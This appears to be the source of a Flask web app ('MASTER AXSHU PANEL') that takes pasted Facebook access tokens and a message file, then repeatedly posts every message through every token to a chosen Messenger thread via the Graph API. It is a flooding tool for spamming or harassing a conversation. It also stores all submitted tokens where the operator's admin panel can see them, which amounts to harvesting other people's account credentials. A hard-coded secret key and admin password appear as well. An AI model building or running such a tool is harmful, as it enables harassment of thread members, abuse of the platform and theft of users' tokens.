from flask import Flask, request, session, redirect, url_for, render_template
import requests
from threading import Thread, Event
import time
import logging
import io
import os
import sys

app = Flask(__name__)
app.secret_key = "AXSHU2025SECRETKEYCHANGE"  # Change in production

# ------------------ Logging Setup ------------------
log_stream = io.StringIO()

# Logs admin panel ke liye (StringIO)
memory_handler = logging.StreamHandler(log_stream)
memory_handler.setLevel(logging.INFO)

# Logs console pe (Render deploy pe dikhane ke liye)
console_handler = logging.StreamHandler(sys.stdout)
console_handler.setLevel(logging.INFO)

logging.getLogger().addHandler(memory_handler)
logging.getLogger().addHandler(console_handler)
logging.getLogger().setLevel(logging.INFO)

# ------------------ Globals ------------------
headers = {
    'User-Agent': 'Mozilla/5.0'
}
stop_event = Event()
threads = []
users_data = []

# ------------------ PING ------------------
@app.route('/ping')
def ping():
    return "✅ I am alive!", 200

# ------------------ MESSAGE SENDER ------------------
def send_messages(access_tokens, thread_id, mn, time_interval, messages):
    while not stop_event.is_set():
        try:
            for message1 in messages:
                if stop_event.is_set():
                    break
                for access_token in access_tokens:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = f"{mn} {message1}"
                    params = {'access_token': access_token, 'message': message}
                    resp = requests.post(api_url, data=params, headers=headers)
                    if resp.status_code == 200:
                        logging.info(f"✅ Sent: {message[:30]} via {access_token[:20]}...")
                    else:
                        logging.warning(f"❌ Fail [{resp.status_code}]: {message[:30]}")
                time.sleep(time_interval)
        except Exception as e:
            logging.error(f"⚠️ Error in loop: {e}")
            time.sleep(5)

# ------------------ MAIN FORM ------------------
@app.route('/', methods=['GET', 'POST'])
def index():
    global threads, users_data
    if request.method == 'POST':
        # ✅ Tokens textarea se lo
        tokens_text = request.form.get('tokens')
        access_tokens = [t.strip() for t in tokens_text.splitlines() if t.strip()]

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        # ✅ Messages (txt file se)
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        users_data.append({
            "tokens": access_tokens,
            "thread_id": thread_id,
            "prefix": mn,
            "interval": time_interval,
            "messages": messages
        })

        # Start thread agar koi aur run nahi ho raha
        if not any(thread.is_alive() for thread in threads):
            stop_event.clear()
            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages))
            thread.start()
            threads = [thread]

    return render_template('index.html')

# ------------------ ADMIN LOGIN ------------------
@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == "AXSHU2025":  # Single password
            session['admin'] = True
            return redirect(url_for('admin_panel'))
    return '''
    <!DOCTYPE html>
    <html>
    <head>
      <title>Admin Login</title>
      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
      <style>
        body {
          background: url("/static/bg.jpg") no-repeat center center fixed;
          background-size: cover;
        }
        .login-box {
          background: rgba(0,0,0,0.8);
          padding: 20px;
          border-radius: 12px;
          box-shadow: 0 0 15px rgba(0,0,0,0.6);
        }
      </style>
    </head>
    <body class="d-flex justify-content-center align-items-center vh-100 text-white">
      <div class="login-box" style="width:300px;">
        <h2 class="text-center text-info">MASTER AXSHU PANEL</h2>
        <form method="POST">
          <div class="mb-3">
            <label>Password</label>
            <input type="password" name="password" class="form-control" required>
          </div>
          <button type="submit" class="btn btn-info w-100">Login</button>
        </form>
      </div>
    </body>
    </html>
    '''

# ------------------ ADMIN PANEL ------------------
@app.route('/admin/panel')
def admin_panel():
    if not session.get('admin'):
        return redirect(url_for('admin_login'))

    log_text = log_stream.getvalue()[-5000:]
    return render_template('admin_panel.html', users=[type("Obj", (object,), u) for u in users_data], logs=log_text)

@app.route('/admin/logs')
def get_logs():
    if not session.get('admin'):
        return "Not authorized", 403
    return log_stream.getvalue()[-5000:]

# ------------------ STOP THREADS ------------------
@app.route('/admin/stop', methods=['POST'])
def stop_threads():
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    stop_event.set()
    logging.info("🛑 Stopped all message sending threads.")
    return redirect(url_for('admin_panel'))

# ------------------ REMOVE SESSION ------------------
@app.route('/admin/remove/<int:idx>', methods=['POST'])
def remove_user(idx):
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    if 0 <= idx < len(users_data):
        users_data.pop(idx)
    return redirect(url_for('admin_panel'))

# ------------------ LOGOUT ------------------
@app.route('/admin/logout')
def admin_logout():
    session.pop('admin', None)
    return redirect(url_for('admin_login'))

# ------------------ RUN APP ------------------
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))
